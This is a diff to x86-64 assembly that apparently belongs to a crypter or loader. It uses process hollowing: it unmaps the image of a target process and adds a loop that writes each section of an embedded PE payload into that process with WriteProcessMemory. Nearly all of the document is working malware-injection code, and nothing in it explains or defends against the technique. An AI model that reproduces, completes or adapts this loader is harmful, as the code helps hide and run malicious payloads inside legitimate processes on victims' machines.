@@ -167,7 +167,10 @@ section .data
     lpAllocatedBaset times 8                         dd 0
     PE times 8                                       dq 0
     lpPreferableBase dd 0x400000
-	
+    Sec times 8                                      dq 0
+    zero times 8                                     dd 0
+    Ptrt times 8                                     dq 0
+
 section .codered
 	CodeRed:
 	Buffer2 times 800000                         db 0
@@ -327,6 +330,7 @@ section .deccode
 	mov edi, [eax]
 	mov [VA], eax
 	
+	
 	;ZwUnmapViewOfSection
 	mov rax, [lpPreferableBase]
 	cmp rax, [lpPebImageBase]
@@ -351,6 +355,8 @@ section .deccode
 	mov rcx, [ProcInfo+PROCESSINFO.hProcess]
 	mov rdx, [lpPebImageBase]
 	call rax
+	
+	
 	
 	lpAllocatedBase:
 		call Locate_kernel32
@@ -499,6 +505,71 @@ section .deccode
 		mov rcx, [ProcInfo+PROCESSINFO.hProcess]
 		call r12
 		add rsp, 0x30
+		
+		mov rax, [lpImageBase]
+		mov eax, [rax+0x3C]
+		movsxd rdx,eax
+		mov rax, [lpImageBase]
+		add rax, Rdx
+		add rax, 0x108
+		mov [Sec], Rax
+		mov dword[zero], 0
+		jmp Decisao3
+	Delta:
+		;lookup WriteProcessMemory
+		call WriteProcess
+		mov eax, dword[zero]
+		movsxd rdx,eax
+		mov rax,Rdx
+		shl rax, 0x2
+		add rax,Rdx
+		shl rax, 0x3
+		mov rdx, Rax
+		mov rax, [Sec]
+		add rax, Rdx
+		mov eax, dword [rax+0x10]
+		mov r9d, eax
+		mov eax, dword[zero]
+		movsxd rdx,eax
+		mov rax,Rdx
+		shl rax, 0x2
+		add rax,Rdx
+		shl rax, 0x3
+		mov rdx,Rax
+		mov rax, [Sec]
+		add rax,Rdx
+		mov eax, dword [rax+0x14]
+		mov edx,eax
+		mov rax, [lpImageBase]
+		add rax,Rdx
+		mov r8, Rax
+		mov rax, [Sec]
+		xor rdx,rdx
+		mov edx, dword [rax+0x0c]
+		xor rax,rax
+		mov eax, [lpPreferableBase]
+		add rax,Rdx
+		mov rcx, rax
+		mov rax, [ProcInfo+PROCESSINFO.hProcess] 
+		lea rdi, [Ptrt]
+		mov [rsp+0x20],Rdi
+		mov rdx, rcx
+		mov rcx, Rax
+		call r12
+        
+		
+		
+		
+		
+	Decisao3:
+		mov rax, [PE]
+		movzx eax, word [rax+0x06]
+		movzx eax,ax
+		cmp eax, dword[zero]
+		jg Delta
+		
+		
+		
 		
 	
 	;delta   
